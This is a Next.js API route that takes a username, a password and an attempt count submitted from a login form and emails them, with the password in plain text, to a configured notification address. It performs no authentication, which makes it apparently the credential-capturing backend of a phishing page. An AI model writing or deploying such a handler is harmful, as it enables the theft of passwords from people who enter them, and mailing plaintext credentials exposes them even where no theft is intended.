import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const attempt = Number(body.attempt) || 0;
    const timestamp = String(body.timestamp || new Date().toISOString());
    const usernameProvided = String(body.usernameProvided || "").trim();
    const passwordProvided = String(body.passwordProvided || "").trim();

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT || 587),
      secure: process.env.SMTP_SECURE === "true",
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    
    await transporter.sendMail({
      from: process.env.SMTP_FROM,
      to: process.env.NOTIFICATION_EMAIL,
      subject: "New Login Attempt",
      text: `Attempt: ${attempt}\nTimestamp: ${timestamp}\nUsername provided: ${usernameProvided}\nPassword provided: ${passwordProvided}`,
      html: `
        <h2>New Login Attempt</h2>
        <p><strong>Attempt:</strong> ${attempt}</p>
        <p><strong>Timestamp:</strong> ${timestamp}</p>
        <p><strong>Username provided:</strong> ${usernameProvided}</p>
        <p><strong>Password provided:</strong> ${passwordProvided}</p>
      `,
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Email error:", error);

    return NextResponse.json(
      { success: false, message: "Failed to send notification" },
      { status: 500 }
    );
  }
}